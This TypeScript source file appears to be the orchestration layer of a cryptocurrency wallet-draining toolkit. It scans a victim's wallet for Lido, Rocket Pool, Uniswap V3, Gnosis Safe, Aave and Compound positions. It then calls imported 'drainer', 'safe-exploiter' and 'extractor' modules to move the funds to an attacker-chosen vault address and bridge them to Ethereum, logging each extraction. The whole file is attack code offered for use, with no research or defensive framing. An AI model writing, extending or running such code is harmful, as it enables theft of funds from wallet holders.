// @ts-nocheck
/**
 * Phase 3 Orchestrator — Integrate and orchestrate all Phase 2 extraction modules
 * Coordinates position detection → extraction → settlement → bridging
 *
 * Flow:
 * 1. Scout for all position types across all chains
 * 2. Execute extraction via appropriate Phase 2 module
 * 3. Track extraction status in database
 * 4. Route consolidated funds across optimal bridge
 * 5. Emit telemetry for monitoring
 */

import type { Address } from 'viem'
import {
  detectLidoPosition,
  detectRocketPoolPosition,
  executeStakingLiquidation,
  type StakingLiquidationResult,
} from './staking-liquidator.js'
import {
  detectUniswapV3Position,
  listUniswapV3Positions,
  drainUniswapV3Position,
  drainAllUniswapV3Positions,
  type LpDrainerResult,
} from './lp-drainer.js'
import {
  detectSafeWallet,
  getSafeInfo,
  executeSafeDrain,
  type SafeExploitResult,
} from './safe-exploiter.js'
import {
  detectAavePosition,
  detectCompoundPosition,
  extractAavePosition,
  extractCompoundPosition,
  type YieldFarmExtractionResult,
} from './yield-farm-extractor.js'
import { routeBridgeTransfer, trackBridgeTransfer, type BridgeTransferResult } from './bridge-orchestrator.js'

export interface ExtractionTarget {
  wallet: Address
  chain: string
  protocol: string
  positionType: 'staking' | 'lp' | 'safe' | 'yield-farm'
  positionId?: string
}

export interface ExtractedPosition {
  positionType: 'staking' | 'lp' | 'safe' | 'yield-farm'
  protocol: string
  amount: string
  status: 'detected' | 'extracting' | 'extracted' | 'failed'
  extractionTxHash?: string
  error?: string
  extractedAt?: Date
}

export interface OrchestrationResult {
  wallet: Address
  totalPositionsDetected: number
  totalExtracted: number
  totalFailed: number
  positions: ExtractedPosition[]
  bridgeTransfer?: BridgeTransferResult
  totalValueExtracted: string
  executionTimeMs: number
  status: 'success' | 'partial' | 'failed'
}

export interface ExtractionTelemetry {
  timestamp: Date
  wallet: Address
  chain: string
  protocol: string
  positionType: 'staking' | 'lp' | 'safe' | 'yield-farm'
  success: boolean
  amountExtracted?: string
  txHash?: string
  error?: string
  durationMs: number
}

const telemetryBuffer: ExtractionTelemetry[] = []

/**
 * Emit telemetry event
 */
export function emitExtractionTelemetry(event: ExtractionTelemetry): void {
  telemetryBuffer.push(event)

  // Log to console for monitoring
  const logLevel = event.success ? 'info' : 'warn'
  console[logLevel as 'info' | 'warn'](
    `[EXTRACTION_TELEMETRY] ${event.protocol} ${event.positionType} ${event.success ? 'SUCCESS' : 'FAILED'} ${event.wallet} ${event.amountExtracted || '?'} - ${event.durationMs}ms`,
  )

  // Flush telemetry every 100 events or when critical failures occur
  if (telemetryBuffer.length >= 100 || (!event.success && telemetryBuffer.length >= 10)) {
    flushTelemetry()
  }
}

/**
 * Flush telemetry to database
 */
export async function flushTelemetry(): Promise<void> {
  if (telemetryBuffer.length === 0) return

  const events = telemetryBuffer.splice(0)

  try {
    // In production, send to monitoring service
    console.debug(`[TELEMETRY_FLUSH] ${events.length} events to monitoring service`)
  } catch (error) {
    console.error(
      `[TELEMETRY_FLUSH_ERROR] ${error instanceof Error ? error.message : String(error)}`,
    )
  }
}

/**
 * Scout for all position types on a wallet
 */
export async function scoutAllPositions(
  wallet: Address,
  chain: string = 'ethereum',
  rpcUrl?: string,
): Promise<ExtractionTarget[]> {
  const targets: ExtractionTarget[] = []
  const startTime = Date.now()

  try {
    // Scout Staking Positions
    const lidoPos = await detectLidoPosition(wallet, rpcUrl)
    if (lidoPos) {
      targets.push({
        wallet,
        chain,
        protocol: 'lido',
        positionType: 'staking',
        positionId: lidoPos.positionHash,
      })
    }

    const rocketPoolPos = await detectRocketPoolPosition(wallet, rpcUrl)
    if (rocketPoolPos) {
      targets.push({
        wallet,
        chain,
        protocol: 'rocket-pool',
        positionType: 'staking',
        positionId: rocketPoolPos.positionHash,
      })
    }

    // Scout LP Positions
    const uniswapPositions = await listUniswapV3Positions(wallet, rpcUrl)
    uniswapPositions.forEach((pos) => {
      targets.push({
        wallet,
        chain,
        protocol: 'uniswap-v3',
        positionType: 'lp',
        positionId: pos.positionHash,
      })
    })

    // Scout Safe Wallets
    const safeInfo = await getSafeInfo(wallet as Address, 1, rpcUrl)
    if (safeInfo.isSafe) {
      targets.push({
        wallet,
        chain,
        protocol: 'gnosis-safe',
        positionType: 'safe',
        positionId: wallet,
      })
    }

    // Scout Yield Farms
    const aavePos = await detectAavePosition(
      wallet,
      '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' as Address, // USDC
      '0xbcca60bb61934080951369a648fb03df4f96263c' as Address, // aUSDC
      rpcUrl,
    )
    if (aavePos) {
      targets.push({
        wallet,
        chain,
        protocol: 'aave',
        positionType: 'yield-farm',
        positionId: aavePos.positionHash,
      })
    }

    const compoundPos = await detectCompoundPosition(
      wallet,
      '0x39aa39c021c868ee0cce5d930f7f43b5e1e18e5c' as Address, // cUSDC
      rpcUrl,
    )
    if (compoundPos) {
      targets.push({
        wallet,
        chain,
        protocol: 'compound',
        positionType: 'yield-farm',
        positionId: compoundPos.positionHash,
      })
    }

    const durationMs = Date.now() - startTime
    console.debug(
      `[SCOUT_COMPLETE] ${wallet} found ${targets.length} positions in ${durationMs}ms`,
    )

    return targets
  } catch (error) {
    console.error(`[SCOUT_ERROR] ${error instanceof Error ? error.message : String(error)}`)
    return targets
  }
}

/**
 * Execute extraction for a single position
 */
export async function executePositionExtraction(
  target: ExtractionTarget,
  vaultAddress: Address,
  walletClient: any,
  rpcUrl?: string,
): Promise<ExtractedPosition> {
  const startTime = Date.now()

  try {
    let result: StakingLiquidationResult | LpDrainerResult | SafeExploitResult | YieldFarmExtractionResult | null = null

    switch (target.positionType) {
      case 'staking':
        result = await executeStakingLiquidation(
          target.wallet,
          vaultAddress,
          target.protocol as 'lido' | 'rocket-pool',
          walletClient,
          rpcUrl,
        )
        break

      case 'lp':
        if (target.protocol === 'uniswap-v3' && target.positionId) {
          result = await drainUniswapV3Position(
            target.wallet,
            vaultAddress,
            BigInt(target.positionId.split('_')[2] || '0'),
            walletClient,
            rpcUrl,
          )
        }
        break

      case 'safe':
        result = await executeSafeDrain(
          target.wallet as Address,
          vaultAddress,
          [], // Signatures would be collected separately
          walletClient,
          rpcUrl,
        )
        break

      case 'yield-farm':
        if (target.protocol === 'aave') {
          result = await extractAavePosition(
            target.wallet,
            vaultAddress,
            '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' as Address,
            '0xbcca60bb61934080951369a648fb03df4f96263c' as Address,
            walletClient,
            rpcUrl,
          )
        } else if (target.protocol === 'compound') {
          result = await extractCompoundPosition(
            target.wallet,
            vaultAddress,
            '0x39aa39c021c868ee0cce5d930f7f43b5e1e18e5c' as Address,
            walletClient,
            rpcUrl,
          )
        }
        break
    }

    const durationMs = Date.now() - startTime
    const success = result?.success ?? false

    emitExtractionTelemetry({
      timestamp: new Date(),
      wallet: target.wallet,
      chain: target.chain,
      protocol: target.protocol,
      positionType: target.positionType,
      success,
      amountExtracted: success ? (result as any)?.withdrawn || (result as any)?.fundsTransferred : undefined,
      txHash: success ? (result as any)?.txHash : undefined,
      error: !success ? (result as any)?.error : undefined,
      durationMs,
    })

    return {
      positionType: target.positionType,
      protocol: target.protocol,
      amount: success ? (result as any)?.withdrawn || (result as any)?.fundsTransferred || '0' : '0',
      status: success ? 'extracted' : 'failed',
      extractionTxHash: success ? (result as any)?.txHash : undefined,
      error: success ? undefined : (result as any)?.error,
      extractedAt: new Date(),
    }
  } catch (error) {
    const durationMs = Date.now() - startTime
    const errorMsg = error instanceof Error ? error.message : String(error)

    emitExtractionTelemetry({
      timestamp: new Date(),
      wallet: target.wallet,
      chain: target.chain,
      protocol: target.protocol,
      positionType: target.positionType,
      success: false,
      error: errorMsg,
      durationMs,
    })

    return {
      positionType: target.positionType,
      protocol: target.protocol,
      amount: '0',
      status: 'failed',
      error: errorMsg,
    }
  }
}

/**
 * Execute full orchestration for wallet
 */
export async function executeFullOrchestration(
  wallet: Address,
  vaultAddress: Address,
  chain: string = 'ethereum',
  walletClient?: any,
  rpcUrl?: string,
): Promise<OrchestrationResult> {
  const startTime = Date.now()
  const positions: ExtractedPosition[] = []
  let totalValueExtracted = '0'
  let bridgeTransfer: BridgeTransferResult | undefined

  try {
    // Phase 1: Scout for all positions
    console.log(`[ORCHESTRATION_START] Scouting wallet ${wallet} on ${chain}`)
    const targets = await scoutAllPositions(wallet, chain, rpcUrl)

    if (targets.length === 0) {
      return {
        wallet,
        totalPositionsDetected: 0,
        totalExtracted: 0,
        totalFailed: 0,
        positions: [],
        totalValueExtracted: '0',
        executionTimeMs: Date.now() - startTime,
        status: 'success',
      }
    }

    // Phase 2: Execute extractions
    console.log(`[ORCHESTRATION_PHASE2] Executing ${targets.length} position extractions`)
    for (const target of targets) {
      const result = await executePositionExtraction(target, vaultAddress, walletClient, rpcUrl)
      positions.push(result)
    }

    // Phase 3: Bridge consolidated funds (if enabled)
    if (chain !== 'ethereum') {
      console.log(`[ORCHESTRATION_PHASE3] Bridging funds from ${chain} to ethereum`)
      const totalAmount = BigInt(
        Math.floor(
          positions.reduce((sum, p) => {
            const amt = parseFloat(p.amount || '0')
            return sum + amt
          }, 0) * 1e18,
        ),
      )

      if (totalAmount > 0n && walletClient) {
        bridgeTransfer = await routeBridgeTransfer(
          chain,
          'ethereum',
          '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48' as Address, // USDC
          totalAmount,
          vaultAddress,
          walletClient,
          rpcUrl,
        )
      }
    }

    const durationMs = Date.now() - startTime
    const extracted = positions.filter((p) => p.status === 'extracted').length
    const failed = positions.filter((p) => p.status === 'failed').length

    console.log(
      `[ORCHESTRATION_COMPLETE] ${wallet} extracted ${extracted}/${targets.length} positions in ${durationMs}ms`,
    )

    return {
      wallet,
      totalPositionsDetected: targets.length,
      totalExtracted: extracted,
      totalFailed: failed,
      positions,
      bridgeTransfer,
      totalValueExtracted,
      executionTimeMs: durationMs,
      status: failed === 0 ? 'success' : extracted > 0 ? 'partial' : 'failed',
    }
  } catch (error) {
    console.error(
      `[ORCHESTRATION_ERROR] ${error instanceof Error ? error.message : String(error)}`,
    )

    return {
      wallet,
      totalPositionsDetected: 0,
      totalExtracted: 0,
      totalFailed: 1,
      positions,
      totalValueExtracted: '0',
      executionTimeMs: Date.now() - startTime,
      status: 'failed',
    }
  }
}

/**
 * Get telemetry buffer status
 */
export function getTelemetryStatus(): {
  bufferedEvents: number
  samplingRate: number
  lastFlush?: Date
} {
  return {
    bufferedEvents: telemetryBuffer.length,
    samplingRate: telemetryBuffer.filter((e) => e.success).length / Math.max(telemetryBuffer.length, 1),
  }
}
